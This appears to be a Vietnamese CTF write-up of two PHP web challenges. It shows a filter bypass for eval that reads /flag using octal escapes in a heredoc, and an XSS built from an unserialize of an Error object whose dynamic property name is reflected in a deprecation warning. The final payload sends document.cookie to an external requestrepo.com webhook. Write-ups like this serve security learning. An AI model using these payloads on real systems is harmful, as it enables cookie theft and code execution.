# Evalgelist
1 challenge về việc bypass filter khi payload được đưa vào hàm eval của php
<img width="1310" height="642" alt="image" src="https://github.com/user-attachments/assets/7c8c3273-558e-4b9a-aa82-3236987ccad5" />

Mục tiêu là đọc flag ở file `/flag`.

Bài này thì chúng ta có khá là nhiều cách để mà thực hiện. Rõ ràng thấy rằng filter không chặn hàm `require` hoặc `include`. Do cách dễ nhất là tạo được chuỗi `/flag` nữa mà thôi.

## Cách 1: Sử dụng PHP Predefind String

- Đầu tiên sẽ sử dụng các chuỗi được định nghĩa sẵn trong PHP để lấy được kí tự `/`
    - `PHP_MANDIR`: Chỉ định nơi các trang hướng dẫn được cài đặt. Trong trường hợp bài này là `string(18) "/usr/local/php/man"`. :arrow_right: `PHP_MANDIR[0]` ta sẽ lấy được dấu `/`
    - `__FILE__`: đường dẫn đến tên file hiện tại được gọi đến. Trong trường hợp này là `/var/www/html/index.php`. :arrow_right: `[__FILE__][0][0]` ta sẽ lấy được dấu `/`. 
        - Cần phải có [] bao quanh `__FILE__` do nó là magic constant, PHP parser không thể access ngay lập tức như array được, phải bao bọc nó vào context rõ ràng, do vậy `[__FILE__]` sẽ trở thành mảng 1 phần tử `["/var/www/html/index.php"]`

- Tiếp theo chỉ cần `PHP_MANDIR[0].flag`: 
    - Mặc dù nó trả về lỗi trước `Warning: Use of undefined constant flag - assumed 'flag' (this will throw an Error in a future version of PHP) in /var/www/html/index.php`. PHP đang hiểu nó là biến hằng, tuy nhiên không tìm được giá trị khai báo :arrow_right: Chuyển thành string

:arrow_right: Chúng ta có được chuỗi `/flag`
<img width="894" height="643" alt="image" src="https://github.com/user-attachments/assets/5d1dbb00-bffc-4c6a-a435-7b2f19106422" />


## Cách 2: Dùng heredoc
Có 4 cách để khai báo 1 chuỗi trong PHP
1. single quote
2. double quote
3. heredoc
4. nowdoc

2 cách đầu đã rất quen thuộc với bất kì ngôn ngữ lập trình nào. Tuy nhiên php có 2 cách nữa:
- Heredoc: Cách khai báo string nhiều dòng trong php. (Giống `"""` trong python). Nó giống double quote nhưng lại có thể khai báo string nhiều dòng.

Syntax: 
```php=
<?php
$variable = <<<IDENTIFIER
Content here
Variables like $var will be parsed
IDENTIFIER;
?>
```

- Nowdoc: Tương tự như heredoc, tuy nhiên nó không thể thay thể biến
```php=
<?php
$variable = <<<IDENTIFIER
Content here
Variables like $var will NOT be parsed
IDENTIFIER;
?>
```
Biến $var sẽ không được thay thế vào chuỗi.

Kết hợp 1 điều rất thú vị đó là heredoc, double quote cho phép sử dụng mã octal :arrow_right: có thể bypass rất nhiều filter

Payload: 

```
require <<<_
\57\146\154\141\147 # /flag
_;
```
<img width="839" height="632" alt="image" src="https://github.com/user-attachments/assets/c3b4b7ed-feaa-4249-b20c-f785efcebeff" />


# Silent Profit
Bài này là 1 bài XSS khá là lạ bởi vì ngoài code của con bot ra, web chính chỉ gồm 1 file php duy nhất với 2 dòng code :

```php=
<?php 
show_source(__FILE__);
unserialize($_GET['data']);
```

Và mình suy nghĩ ngay đến việc truyền vào thứ gì đó gây ra exception để có thể hiển thị lại những gì mình đã truyền vào bởi vì không có dòng `var_dump` hay `print_r` nào.

Khi truyền vào 1 object bất kì hợp lệ thì sẽ không có gì cả
<img width="672" height="139" alt="image" src="https://github.com/user-attachments/assets/15f2258a-05d4-42ab-8aca-c1cf7514bd2c" />


Khi truyền vào object không hợp lệ trong cấu trúc serialize thì sẽ bị lỗi `Error at offset...`  nhưng không có bất kỳ thông tin nào reflect lại mà chúng ta có thể kiểm soát.
<img width="724" height="165" alt="image" src="https://github.com/user-attachments/assets/0af1c826-aa1e-450b-bfc4-5c822542fce2" />


Mình đã nghĩ tới việc sử dụng các built-in object của PHP. Class mình sử dụng ở đây là `Error` class
<img width="636" height="685" alt="image" src="https://github.com/user-attachments/assets/880f422a-e562-4e62-ac35-f9cd8680e76d" />

Mình thử truyền vào object như sau:
```!
O:5:"Error":4:{s:7:"message";s:7:"deptrai";s:4:"code";i:0;s:4:"file";s:9:"index.php";s:7:"perrito";s:2:"de";}
```

Đúng 1 số thuộc tính mà PHP xây dựng sẵn như `message`, `code`, `file` tuy nhiên có 1 thuộc tính nữa không được xây dựng (mình bịa ra) là `perrito`. Khi truyền vào sẽ gặp lỗi sau: 
<img width="816" height="152" alt="image" src="https://github.com/user-attachments/assets/c0973777-7fe1-4ecc-ac87-7a639a4b517e" />


`Deprecated: Creation of dynamic property Error::$perrito is deprecated in /var/www/html/index.php on line 3`

Từ `perrito` đã được reflect lại trên đây. Rồi giờ mình thử chèn payload XSS vào xem sao:
```!
O:5:"Error":4:{s:7:"message";s:7:"deptrai";s:4:"code";i:0;s:4:"file";s:9:"index.php";s:21:"<svg/onload=alert(1)>";s:2:"de";}
```
<img width="893" height="303" alt="image" src="https://github.com/user-attachments/assets/9bb59a77-e5d8-4aea-98d8-1bebe0b671d5" />


Alert đã xuất hiện, giờ chỉ cần thêm hàm fetch đến webhook rồi gửi cho bot thôi là xong!
```!
O:5:"Error":4:{s:7:"message";s:7:"deptrai";s:4:"code";i:0;s:4:"file";s:9:"index.php";s:77:"<svg/onload=fetch('https://9m42157q.requestrepo.com/?flag='+document.cookie)>";s:2:"de";}
```
<img width="957" height="678" alt="image" src="https://github.com/user-attachments/assets/d4bdd76b-c6fe-4bb3-a44e-b1a87dde43b5" />



